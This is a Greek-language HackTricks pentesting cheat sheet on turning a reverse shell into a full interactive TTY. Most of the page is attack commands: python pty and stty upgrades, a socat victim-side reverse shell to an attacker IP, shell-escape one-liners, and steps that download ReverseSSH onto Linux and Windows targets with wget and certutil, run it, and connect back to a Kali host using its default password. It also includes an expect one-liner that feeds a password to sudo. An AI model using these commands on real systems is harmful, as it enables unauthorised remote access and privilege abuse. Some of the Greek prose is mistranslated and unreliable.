# Πλήρης TTYs

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Πλήρες TTY

Σημειώστε ότι η κέλυφος που ορίζετε στη μεταβλητή `SHELL` **πρέπει** να **είναι καταχωρημένη μέσα** στον _**/etc/shells**_ ή `Η τιμή για τη μεταβλητή SHELL δεν βρέθηκε στο αρχείο /etc/shells. Αυτό το περιστατικό έχει αναφερθεί`. Επίσης, σημειώστε ότι τα επόμενα αποσπάσματα λειτουργούν μόνο στο bash. Εάν βρίσκεστε σε ένα zsh, αλλάξτε σε ένα bash πριν αποκτήσετε την κέλυφος εκτελώντας `bash`.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
Μπορείτε να πάρετε τον **αριθμό** των **σειρών** και **στηλών** εκτελώντας **`stty -a`**
{% endhint %}

#### script

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% code %}

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Δημιουργία κατακόρυφων κελιών**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

Ένας βολικός τρόπος για **διαδραστική πρόσβαση σε κελί**, καθώς και για **μεταφορά αρχείων** και **προώθηση θυρών**, είναι να ανεβάσετε τον στατικά συνδεδεμένο διακομιστή ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh) στον στόχο.

Παρακάτω παρατίθεται ένα παράδειγμα για `x86` με συμπιεσμένα δυαδικά αρχεία upx. Για άλλα δυαδικά αρχεία, ελέγξτε την [σελίδα κυκλοφορίας](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Προετοιμασία τοπικά για να πιάσετε το αίτημα προώθησης θύρας ssh:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2α) Στόχος Linux:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Στόχος Windows 10 (για προηγούμενες εκδόσεις, ελέγξτε το [project readme](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* Εάν η αίτηση για ανακλινόμενη προώθηση θύρας ReverseSSH ήταν επιτυχής, τώρα θα πρέπει να μπορείτε να συνδεθείτε με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls` στο πλαίσιο του χρήστη που εκτελεί το `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Χωρίς TTY

Αν για οποιονδήποτε λόγο δεν μπορείτε να αποκτήσετε ένα πλήρες TTY, μπορείτε παραμένοντας αλληλεπιδραστικοί με προγράμματα που αναμένουν είσοδο από τον χρήστη. Στο παρακάτω παράδειγμα, ο κωδικός περνιέται στο `sudo` για να διαβάσει ένα αρχείο:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
